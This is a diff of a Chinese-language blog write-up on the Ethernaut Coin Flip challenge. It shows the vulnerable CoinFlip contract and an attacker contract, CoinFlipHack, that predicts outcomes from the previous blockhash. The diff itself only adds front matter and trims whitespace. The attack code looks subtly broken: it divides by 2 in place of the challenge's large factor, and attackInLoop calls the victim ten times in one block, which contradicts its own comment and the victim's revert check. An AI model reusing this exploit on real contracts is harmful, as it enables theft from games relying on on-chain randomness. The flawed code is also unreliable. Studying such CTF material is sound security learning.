@@ -5,6 +5,7 @@ description: "Ethernaut challenge 03: Coin Flip randomness vulnerability analysi
 categories: ["Ethernaut", "Smart Contract Security"]
 tags: ["Ethernaut", "Solidity", "Smart Contracts", "Security"]
 draft: false
+weight: 3
 ---
 
 **踩坑记录**：区块链上的随机数很难。最初以为用 `block.number` 就够了，结果看了 Writeup 才知道这是确定性环境。
@@ -16,18 +17,18 @@ draft: false
 contract CoinFlip {
     uint256 public consecutiveWins;
     uint256 lastHash;
-    
+
     function flip(bool _guess) public returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
-        
+
         if (lastHash == blockValue) {
             revert();
         }
-        
+
         lastHash = blockValue;
         uint256 coinFlip = blockValue / 2;
         bool side = coinFlip == 1 ? true : false;
-        
+
         if (side == _guess) {
             consecutiveWins++;
             return true;
@@ -47,19 +48,19 @@ contract CoinFlip {
 contract CoinFlipHack {
     CoinFlip public victim;
     uint256 public consecutiveWins;
-    
+
     constructor(address _victim) {
         victim = CoinFlip(_victim);
     }
-    
+
     function attack() public {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 coinFlip = blockValue / 2;
         bool guess = coinFlip == 1 ? true : false;
-        
+
         victim.flip(guess);
     }
-    
+
     // 必须每个区块调用一次，因为 blockhash 只在当前区块有效
     function attackInLoop() public {
         for (uint i = 0; i < 10; i++) {
